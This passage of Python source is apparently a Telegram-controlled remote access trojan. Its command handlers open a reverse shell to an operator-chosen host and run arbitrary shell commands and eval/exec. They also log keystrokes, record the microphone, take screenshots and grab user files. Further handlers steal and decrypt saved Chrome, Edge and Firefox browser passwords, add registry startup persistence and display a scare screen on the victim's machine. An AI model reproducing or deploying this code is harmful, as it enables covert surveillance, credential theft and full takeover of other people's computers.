        except Exception as e:
            await update.message.reply_text(f"Error: {str(e)}")

    async def bluetooth_control(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            # This is a placeholder - actual Bluetooth control would require additional libraries
            await update.message.reply_text("Bluetooth control is not yet implemented.")
        except Exception as e:
            await update.message.reply_text(f"Error: {str(e)}")

    async def geolocate(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            # Get location based on IP
            public_ip = self.get_public_ip()
            if public_ip != "Unknown":
                # Try multiple geolocation services for better accuracy
                location_data = None
                location_source = "IP API"
                
                # First try ip-api.com
                try:
                    response = requests.get(f"http://ip-api.com/json/{public_ip}", timeout=5)
                    location_data = response.json()
                    if location_data.get("status") != "success":
                        location_data = None
                except:
                    location_data = None
                
                # If first service fails, try ipinfo.io
                if not location_data:
                    try:
                        response = requests.get(f"https://ipinfo.io/{public_ip}/json", timeout=5)
                        location_data = response.json()
                        location_source = "IPInfo"
                    except:
                        location_data = None
                
                # If both services fail, try httpbin.org for IP only
                if not location_data:
                    try:
                        response = requests.get(f"https://httpbin.org/ip", timeout=5)
                        location_data = {"ip": response.json().get("origin", "Unknown"), "source": "httpbin"}
                        location_source = "HTTPBin"
                    except:
                        location_data = None
                
                if location_data and location_data.get("status") != "fail":
                    if location_source == "IP API":
                        location_info = f"""
Location (source: {location_source}):
Country: {location_data.get("country", "N/A")}
Region: {location_data.get("regionName", "N/A")}
City: {location_data.get("city", "N/A")}
Latitude: {location_data.get("lat", "N/A")}
Longitude: {location_data.get("lon", "N/A")}
ISP: {location_data.get("isp", "N/A")}
Timezone: {location_data.get("timezone", "N/A")}
"""
                    elif location_source == "IPInfo":
                        loc = location_data.get("loc", "N/A").split(',')
                        lat = loc[0] if len(loc) > 0 else "N/A"
                        lon = loc[1] if len(loc) > 1 else "N/A"
                        location_info = f"""
Location (source: {location_source}):
Country: {location_data.get("country", "N/A")}
Region: {location_data.get("region", "N/A")}
City: {location_data.get("city", "N/A")}
Latitude: {lat}
Longitude: {lon}
ISP: {location_data.get("org", "N/A")}
Timezone: {location_data.get("timezone", "N/A")}
"""
                    else:
                        location_info = f"""
Location (source: {location_source}):
IP: {location_data.get("ip", "N/A")}
Note: Detailed location data unavailable
"""
                    await update.message.reply_text(location_info)
                else:
                    await update.message.reply_text("Could not get location.")
            else:
                await update.message.reply_text("Could not get location.")
        except Exception as e:
            await update.message.reply_text(f"Error: {str(e)}")

    async def microphone_record(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            import pyaudio
            import wave
            import threading
            
            duration = int(context.args[0]) if context.args else 10  # Default 10 seconds
            if duration > 60:  # Limit to 60 seconds max
                duration = 60
            
            await update.message.reply_text(f"Recording microphone for {duration} seconds...")
            
            # Audio parameters
            chunk = 1024
            format = pyaudio.paInt16
            channels = 1
            rate = 44100
            
            # Initialize PyAudio
            p = pyaudio.PyAudio()
            
            # Open stream
            stream = p.open(format=format,
                           channels=channels,
                           rate=rate,
                           input=True,
                           frames_per_buffer=chunk)
            
            frames = []
            
            # Record audio
            for i in range(0, int(rate / chunk * duration)):
                data = stream.read(chunk)
                frames.append(data)
            
            # Stop and close stream
            stream.stop_stream()
            stream.close()
            p.terminate()
            
            # Save as WAV file
            temp_path = os.path.join(tempfile.gettempdir(), "microphone_recording.wav")
            wf = wave.open(temp_path, 'wb')
            wf.setnchannels(channels)
            wf.setsampwidth(p.get_sample_size(format))
            wf.setframerate(rate)
            wf.writeframes(b''.join(frames))
            wf.close()
            
            # Send the recorded file
            await update.message.reply_audio(open(temp_path, 'rb'))
            
            # Clean up
            os.remove(temp_path)
            
        except ImportError:
            await update.message.reply_text("Pyaudio library is not installed. Run: pip install pyaudio")
        except Exception as e:
            await update.message.reply_text(f"Error recording microphone: {str(e)}")

    async def reverse_shell(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            host = context.args[0]
            port = int(context.args[1])
            threading.Thread(target=self._reverse_shell, args=(host, port)).start()
            await update.message.reply_text(f"Reverse shell launched on {host}:{port}")
        except Exception as e:
            await update.message.reply_text(f"Error: {str(e)}")

    def _reverse_shell(self, host, port):
        import socket
        import subprocess
        import os
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        for fd in (0, 1, 2):
            os.dup2(s.fileno(), fd)
        subprocess.call(["/bin/sh", "-i"])

    async def put_file(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        file_path = context.args[0]
        try:
            with open(file_path, 'rb') as f:
                await update.message.reply_document(f)
            await update.message.reply_text("File uploaded successfully")
        except Exception as e:
            await update.message.reply_text(f"Error: {str(e)}")

    async def get_file(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        file_name = context.args[0]
        try:
            with open(file_name, 'rb') as f:
                await update.message.reply_document(f)
            await update.message.reply_text("File downloaded successfully")
        except Exception as e:
            await update.message.reply_text(f"Error: {str(e)}")

    async def run_code(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        code = ' '.join(context.args)
        try:
            result = str(eval(code))
            await update.message.reply_text(f"Result:\n{result}")
        except Exception as e:
            await update.message.reply_text(f"Error: {str(e)}")

    async def screenshot(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            img = pyautogui.screenshot()
            img.save("screenshot.png")
            await update.message.reply_photo(open("screenshot.png", 'rb'))
            os.remove("screenshot.png")
        except Exception as e:
            await update.message.reply_text(f"Error: {str(e)}")

    async def keylogger(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        action = context.args[0] if context.args else ""
        if action == "start":
            if not self.keylogger_active:
                self.keylogger_active = True
                keyboard.hook(self._log_key)
                await update.message.reply_text("Keylogger started")
            else:
                await update.message.reply_text("Keylogger already running")
        elif action == "stop":
            if self.keylogger_active:
                self.keylogger_active = False
                keyboard.unhook_all()
                with open("keylog.txt", "w") as f:
                    f.write('\n'.join(self.keylog_data))
                await update.message.reply_document(open("keylog.txt", "rb"))
                os.remove("keylog.txt")
                self.keylog_data = []
                await update.message.reply_text("Keylogger stopped, data sent")
            else:
                await update.message.reply_text("Keylogger not running")
        else:
            await update.message.reply_text("Usage: /keylogger <start/stop>")

    def _log_key(self, event):
        if self.keylogger_active:
            self.keylog_data.append(f"{time.ctime()}: {event.name}")

    async def schedule_task(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            command = context.args[0]
            delay = int(context.args[1])
            task_id = len(self.scheduled_tasks) + 1
            self.scheduled_tasks[task_id] = (command, time.time() + delay)
            threading.Timer(delay, self._execute_scheduled_task, args=(command,)).start()
            await update.message.reply_text(f"Task scheduled: {command} in {delay} seconds")
        except Exception as e:
            await update.message.reply_text(f"Error: {str(e)}")

    def _execute_scheduled_task(self, command):
        try:
            if command == "screenshot":
                pyautogui.screenshot().save("screenshot.png")
            elif command.startswith("reverse"):
                host, port = command.split()[1], int(command.split()[2])
                self._reverse_shell(host, port)
        except Exception as e:
            print(f"Error executing scheduled task: {str(e)}")

    async def run_custom(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        script_name = context.args[0]
        try:
            script_path = os.path.join("scripts", f"{script_name}.py")
            with open(script_path) as f:
                code = f.read()
            exec(code, globals())
            await update.message.reply_text(f"Custom script {script_name} executed")
        except Exception as e:
            await update.message.reply_text(f"Error: {str(e)}")

    async def file_grab(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        if not context.args:
            await update.message.reply_text("Usage: /grab <file_path>")
            return
        file_path = context.args[0]
        common_paths = [
            file_path,
            os.path.join(os.path.expanduser("~"), file_path),
            os.path.join(os.path.expanduser("~"), "Desktop", file_path),
            os.path.join(os.path.expanduser("~"), "Documents", file_path),
            os.path.join(os.path.expanduser("~"), "Downloads", file_path)
        ]
        found = False
        for path in common_paths:
            if os.path.exists(path):
                file_path = path
                found = True
                break
        if not found:
            await update.message.reply_text(f"File not found: {file_path}")
            return
        try:
            file_size = os.path.getsize(file_path)
            if file_size > 50 * 1024 * 1024:
                await update.message.reply_text(f"File too large to send ({file_size} bytes). Max size: 50MB")
                return
            with open(file_path, 'rb') as f:
                await update.message.reply_document(f)
            await update.message.reply_text(f"File '{os.path.basename(file_path)}' sent.")
        except Exception as e:
            await update.message.reply_text(f"Error sending file: {str(e)}")

    async def password_stealer(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            await update.message.reply_text("Starting password theft...")
            passwords = self._steal_passwords()
            if passwords:
                with open("passwords.txt", "w", encoding='utf-8') as f:
                    for url, password in passwords:
                        f.write(f"{url}: {password}\n")
                await update.message.reply_document(open("passwords.txt", "rb"))
                os.remove("passwords.txt")
                await update.message.reply_text(f"Acquired {len(passwords)} passwords.")
            else:
                browsers = {
                    "Chrome": os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data"),
                    "Firefox": os.path.expandvars("%APPDATA%\\Mozilla\\Firefox\\Profiles"),
                    "Edge": os.path.expandvars("%LOCALAPPDATA%\\Microsoft\\Edge\\User Data"),
                    "Opera": os.path.expandvars("%APPDATA%\\Opera Software\\Opera Stable")
                }
                browsers_found = [b for b, p in browsers.items() if os.path.exists(p)]
                if browsers_found:
                    await update.message.reply_text("No passwords found. Found these browsers: " + ", ".join(browsers_found))
                else:
                    await update.message.reply_text("No browsers with saved passwords found.")
        except Exception as e:
            await update.message.reply_text(f"Error stealing passwords: {str(e)}")

    def _steal_passwords(self):
        passwords = []
        browsers = {
            "Chrome": os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data"),
            "Firefox": os.path.expandvars("%APPDATA%\\Mozilla\\Firefox\\Profiles"),
            "Edge": os.path.expandvars("%LOCALAPPDATA%\\Microsoft\\Edge\\User Data"),
            "Opera": os.path.expandvars("%APPDATA%\\Opera Software\\Opera Stable")
        }
        for browser, path in browsers.items():
            if os.path.exists(path):
                if browser in ["Chrome", "Edge"]:
                    profiles = []
                    default_path = os.path.join(path, "Default")
                    if os.path.exists(default_path):
                        profiles.append(default_path)
                    for item in os.listdir(path):
                        item_path = os.path.join(path, item)
                        if os.path.isdir(item_path) and item.startswith("Profile"):
                            profiles.append(item_path)
                    for profile_path in profiles:
                        passwords.extend(self._parse_browser_passwords(browser, profile_path))
                else:
                    passwords.extend(self._parse_browser_passwords(browser, path))
        return passwords

    def _parse_browser_passwords(self, browser, path):
        passwords = []
        try:
            if browser in ["Chrome", "Edge", "Opera"]:
                login_data_path = os.path.join(path, "Login Data")
                if not os.path.exists(login_data_path):
                    return passwords
                temp_path = login_data_path + "_temp"
                try:
                    # Copy the file to avoid locking issues
                    shutil.copyfile(login_data_path, temp_path)
                    conn = sqlite3.connect(temp_path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    credential_data = cursor.fetchall()
                    conn.close()

                    for url, username, encrypted_password in credential_data:
                        decrypted_password = self._decrypt_chrome_password(encrypted_password)
                        if decrypted_password:
                            passwords.append((url, f"Username: {username} | Password: {decrypted_password}"))
                        elif username:
                            passwords.append((url, f"Username: {username} (password decryption failed)"))
                        elif encrypted_password:  # If we have password but no username
                            decrypted_password = self._decrypt_chrome_password(encrypted_password)
                            if decrypted_password:
                                passwords.append((url, f"Password: {decrypted_password} (no username)"))
                            else:
                                passwords.append((url, "Password found but decryption failed"))
                except sqlite3.OperationalError:
                    # Handle case where database is locked
                    passwords.append(("Database Error", f"Could not access {login_data_path} - possibly locked by browser"))
                finally:
                    # Remove temp file
                    if os.path.exists(temp_path):
                        os.remove(temp_path)
            elif browser == "Firefox":
                passwords.extend(self._extract_firefox_passwords(path))
        except:
            pass
        return passwords

    def _decrypt_chrome_password(self, encrypted_password):
        try:
            if len(encrypted_password) > 3 and (encrypted_password[:3] == b'v10' or encrypted_password[:3] == b'v11'):
                return self._decrypt_chrome_password_aes(encrypted_password)
            import ctypes
            import ctypes.wintypes as wintypes
            from ctypes import Structure, c_void_p, create_string_buffer
            class DATA_BLOB(Structure):
                _fields_ = [("cbData", wintypes.DWORD), ("pbData", c_void_p)]
            crypt32 = ctypes.windll.crypt32
            encrypted_buffer = create_string_buffer(encrypted_password)
            encrypted_blob = DATA_BLOB(len(encrypted_password), ctypes.cast(encrypted_buffer, c_void_p))
            decrypted_blob = DATA_BLOB()
            if crypt32.CryptUnprotectData(ctypes.byref(encrypted_blob), None, None, None, None, 0, ctypes.byref(decrypted_blob)):
                decrypted_data = ctypes.string_at(decrypted_blob.pbData, decrypted_blob.cbData)
                crypt32.LocalFree(decrypted_blob.pbData)
                return decrypted_data.decode('utf-8')
        except:
            pass
        return None

    def _decrypt_chrome_password_aes(self, encrypted_password):
        try:
            if len(encrypted_password) < 19:
                return None
            prefix = encrypted_password[:3]
            if prefix not in [b'v10', b'v11', b'v20']:
                return None
            nonce = encrypted_password[3:15]
            ciphertext_and_tag = encrypted_password[15:]
            key = self._get_chrome_aes_key()
            if key is None:
                return None
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            aesgcm = AESGCM(key)
            decrypted_password = aesgcm.decrypt(nonce, ciphertext_and_tag, None)
            return decrypted_password.decode('utf-8')
        except:
            pass
        return None

    def _get_chrome_aes_key(self):
        try:
            local_state_path = os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State")
            if not os.path.exists(local_state_path):
                return None
            with open(local_state_path, 'r') as f:
                local_state = json.load(f)
            encrypted_key = local_state.get("os_crypt", {}).get("encrypted_key")
            if not encrypted_key:
                return None
            encrypted_key = base64.b64decode(encrypted_key)[5:]
            import ctypes
            import ctypes.wintypes as wintypes
            class DATA_BLOB(Structure):
                _fields_ = [("cbData", wintypes.DWORD), ("pbData", c_void_p)]
            crypt32 = ctypes.windll.crypt32
            encrypted_buffer = create_string_buffer(encrypted_key)
            encrypted_blob = DATA_BLOB(len(encrypted_key), ctypes.cast(encrypted_buffer, c_void_p))
            decrypted_blob = DATA_BLOB()
            if crypt32.CryptUnprotectData(ctypes.byref(encrypted_blob), None, None, None, None, 0, ctypes.byref(decrypted_blob)):
                decrypted_key = ctypes.string_at(decrypted_blob.pbData, decrypted_blob.cbData)
                ctypes.windll.kernel32.LocalFree(decrypted_blob.pbData)
                return decrypted_key
        except:
            pass
        return None

    def _extract_firefox_passwords(self, profiles_path):
        passwords = []
        try:
            for profile in os.listdir(profiles_path):
                profile_path = os.path.join(profiles_path, profile)
                if not os.path.isdir(profile_path):
                    continue
                logins_json = os.path.join(profile_path, "logins.json")
                signons_db = os.path.join(profile_path, "signons.sqlite")
                if os.path.exists(logins_json):
                    with open(logins_json, 'r') as f:
                        logins_data = json.load(f)
                    for login in logins_data.get("logins", []):
                        url = login.get("hostname", "")
                        username = login.get("username", "")
                        passwords.append((url, f"Username: {username} (password encrypted)"))
                elif os.path.exists(signons_db):
                    conn = sqlite3.connect(signons_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT hostname FROM moz_logins")
                    for row in cursor.fetchall():
                        passwords.append((row[0], "Username and password encrypted (requires NSS)"))
                    conn.close()
        except:
            pass
        return passwords

    async def persistence(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        try:
            await update.message.reply_text("Adding bot to startup...")
            self._add_to_startup()
            await update.message.reply_text("Bot added to startup.")
        except Exception as e:
            await update.message.reply_text(f"Error adding to startup: {str(e)}")

    def _add_to_startup(self):
        try:
            key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0) as key:
                winreg.SetValueEx(key, "RemoteControlBot", 0, winreg.REG_SZ, sys.executable)
        except:
            pass

    async def anti_vm(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        is_vm = self._check_if_vm()
        if is_vm:
            await update.message.reply_text("Environment is virtual (VM), safe to use.")
        else:
            await update.message.reply_text("Environment is real (non-VM). Possible detection.")

    def _check_if_vm(self):
        checks = ["vmware", "vbox", "qemu", "xen", "virtualbox"]
        try:
            for proc in os.listdir('/proc'):
                if proc.isdigit():
                    with open(f'/proc/{proc}/cmdline', 'r') as f:
                        if any(check in f.read().lower() for check in checks):
                            return True
        except:
            pass
        return False

    async def shell(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        command = ' '.join(context.args)
        if not command:
            await update.message.reply_text("Provide command to execute.")
            return
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, encoding='utf-8', errors='ignore')
            output = result.stdout + result.stderr
            if output.strip():
                await update.message.reply_text(f"```\n{output}\n```")
            else:
                await update.message.reply_text("Command executed, no output.")
        except Exception as e:
            await update.message.reply_text(f"Error executing command: {str(e)}")

    async def browse(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        path = "C:\\" if not context.args else context.args[0]
        try:
            if not os.path.exists(path):
                await update.message.reply_text(f"Path does not exist: {path}")
                return
            if os.path.isfile(path):
                file_size = os.path.getsize(path)
                if file_size > 50 * 1024 * 1024:
                    await update.message.reply_text(f"File too large to send ({file_size} bytes). Max size: 50MB")
                    return
                with open(path, 'rb') as f:
                    await update.message.reply_document(f)
                await update.message.reply_text(f"Sent file: {path}")
                return
            if os.path.isdir(path):
                items = []
                for item in os.listdir(path):
                    item_path = os.path.join(path, item)
                    if os.path.isdir(item_path):
                        items.append(f"📁 {item}/")
                for item in os.listdir(path):
                    item_path = os.path.join(path, item)
                    if os.path.isfile(item_path):
                        size = os.path.getsize(item_path)
                        if size < 1024:
                            size_str = f"{size} B"
                        elif size < 1024 * 1024:
                            size_str = f"{size//1024} KB"
                        elif size < 1024 * 1024 * 1024:
                            size_str = f"{size//(1024*1024)} MB"
                        else:
                            size_str = f"{size//(1024*1024*1024)} GB"
                        items.append(f"📄 {item} ({size_str})")
                items.sort()
                if len(items) > 50:
                    items = items[:50]
                    items.append("... (showing only first 50 items)")
                if items:
                    response = f"Directory contents: {path}\n" + "\n".join(items)
                    if len(response) > 4096:
                        response = response[:4090] + "\n..."
                    await update.message.reply_text(response)
                else:
                    await update.message.reply_text(f"Directory is empty: {path}")
                return
        except Exception as e:
            await update.message.reply_text(f"Error browsing: {str(e)}")

    async def stop_bot(self, update: Update, context: CallbackContext):
        if self.is_admin(update):
            self.keylogger_active = False
            keyboard.unhook_all()
            await update.message.reply_text("Stopping bot and all activities...")
            os._exit(0)
        else:
            await update.message.reply_text("No permissions!")

    def is_admin(self, update: Update):
        # Use the admin ID from the active C2 server
        c2_server = C2_SERVERS[ACTIVE_C2_INDEX]
        if c2_server["type"] == "telegram":
            return update.message.from_user.id == c2_server["admin_id"]
        else:
            # For custom API, you might use different authentication
            return True  # Simplified for this example

    async def jumpscare(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        duration = 3
        if context.args and len(context.args) > 0:
            try:
                duration = int(context.args[0])
            except ValueError:
                pass
        def show_jumpscare():
            root = tk.Tk()
            root.title("!!!")
            root.attributes('-fullscreen', True)
            root.configure(bg='black')
            scary_label = tk.Label(
                root,
                text="!!! YOU'VE BEEN HACKED !!!\n😱💀👻",
                font=("Arial", 48, "bold"),
                fg="red",
                bg="black"
            )
            scary_label.pack(expand=True)
            countdown_label = tk.Label(
                root,
                text=str(duration),
                font=("Arial", 72, "bold"),
                fg="white",
                bg="black"
            )
            countdown_label.pack()
            def countdown(remaining):
                if remaining <= 0:
                    root.destroy()
                else:
                    countdown_label.config(text=str(remaining))
                    root.after(1000, countdown, remaining-1)
            countdown(duration)
            root.attributes('-topmost', True)
            root.mainloop()
        threading.Thread(target=show_jumpscare, daemon=True).start()
        await update.message.reply_text(f"Jumpscare activated for {duration} seconds! Check the target screen.")

    async def show(self, update: Update, context: CallbackContext):
        if not self.is_admin(update):
            return
        if not context.args:
            await update.message.reply_text("Usage: /show <filename>")
            return
        filename = context.args[0]
        local_file_path = self._find_local_file(filename)
        if not local_file_path:
            local_file_path = await self._download_from_telegram(update, filename)
        if not local_file_path:
            await update.message.reply_text(f"File not found: {filename}")
            return
        _, ext = os.path.splitext(local_file_path)
        ext = ext.lower()
        def display_file():
            root = tk.Tk()
            root.title(os.path.basename(local_file_path))
            root.attributes('-fullscreen', True)
            screen_width = root.winfo_screenwidth()
            screen_height = root.winfo_screenheight()
            if ext in ['.png', '.jpg', '.jpeg', '.gif', '.bmp', '.tiff']:
                try:
                    from PIL import Image, ImageTk
                    image = Image.open(local_file_path)
                    image.thumbnail((screen_width, screen_height), Image.LANCZOS)
                    photo = ImageTk.PhotoImage(image)
                    label = tk.Label(root, image=photo)
                    label.pack(expand=True)
                    label.image = photo
                except ImportError:
                    photo = tk.PhotoImage(file=local_file_path)
                    label = tk.Label(root, image=photo)
                    label.pack(expand=True)
                    label.image = photo
                except Exception as e:
                    error_label = tk.Label(root, text=f"Error loading image: {str(e)}\n{local_file_path}", font=("Arial", 24), fg="white", bg="black")
                    error_label.pack(expand=True)
            else:
                error_label = tk.Label(root, text=f"Unsupported file type: {ext}\nSupported types: .png, .jpg, .jpeg, .gif, .bmp, .tiff", font=("Arial", 24), fg="white", bg="black")
                error_label.pack(expand=True)
            close_button = tk.Button(root, text="Close", command=root.destroy, font=("Arial", 18), bg="red", fg="white")
            close_button.pack(side='bottom', pady=20)
            root.attributes('-topmost', True)
            root.mainloop()
        threading.Thread(target=display_file, daemon=True).start()
        await update.message.reply_text(f"Displaying file: {os.path.basename(local_file_path)}")
        if local_file_path != filename and not os.path.exists(filename):
            try:
                os.remove(local_file_path)
            except:
                pass

    def _find_local_file(self, filename):
        if os.path.exists(filename):
            return filename
        common_paths = [
            filename,
            os.path.join(os.path.expanduser("~"), filename),
            os.path.join(os.path.expanduser("~"), "Desktop", filename),
            os.path.join(os.path.expanduser("~"), "Documents", filename),
            os.path.join(os.path.expanduser("~"), "Downloads", filename),
            os.path.join(os.path.dirname(os.path.abspath(__file__)), filename)
        ]
        for path in common_paths:
            if os.path.exists(path):
                return path
        return None

    async def handle_telegram_file(self, update: Update, context: CallbackContext):
        try:
            document = update.message.document
            if not document:
                return
            file_name = document.file_name
            file_id = document.file_id
            self.telegram_files[file_name] = {
                'file_id': file_id,
                'file_unique_id': document.file_unique_id,
                'file_size': document.file_size,
                'timestamp': datetime.now()
            }
            await update.message.reply_text(
                f"File '{file_name}' has been stored in bot memory.\n"
                "You can display it later using command:\n"
                f"/show {file_name}"
            )
        except Exception as e:
            print(f"Error handling Telegram file: {e}")
            await update.message.reply_text("Error saving file information.")

    async def _download_from_telegram(self, update: Update, filename):
        try:
            await update.message.reply_text(f"Looking for file '{filename}' in Telegram messages...")
            if filename not in self.telegram_files:
                found = False
                for stored_filename in self.telegram_files:
                    if filename.lower() in stored_filename.lower() or stored_filename.lower() in filename.lower():
                        filename = stored_filename
                        found = True
                        break
                if not found:
                    await update.message.reply_text(f"File '{filename}' not found in Telegram messages.")
                    return None
            file_info = self.telegram_files[filename]
            file_id = file_info['file_id']
            file = await self.bot_instance.get_file(file_id)
            temp_file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), f"temp_{filename}")
            await file.download_to_drive(temp_file_path)
            await update.message.reply_text(f"Downloaded file '{filename}' from Telegram.")
            return temp_file_path
        except Exception as e:
            print(f"Error downloading from Telegram: {e}")
            await update.message.reply_text(f"Error downloading file from Telegram: {str(e)}")
            return None

def main():
    if not os.path.exists("scripts"):
        os.makedirs("scripts")
    bot = EnhancedRemoteControlBot()
    bot.setup_application()

if __name__ == "__main__":
    main()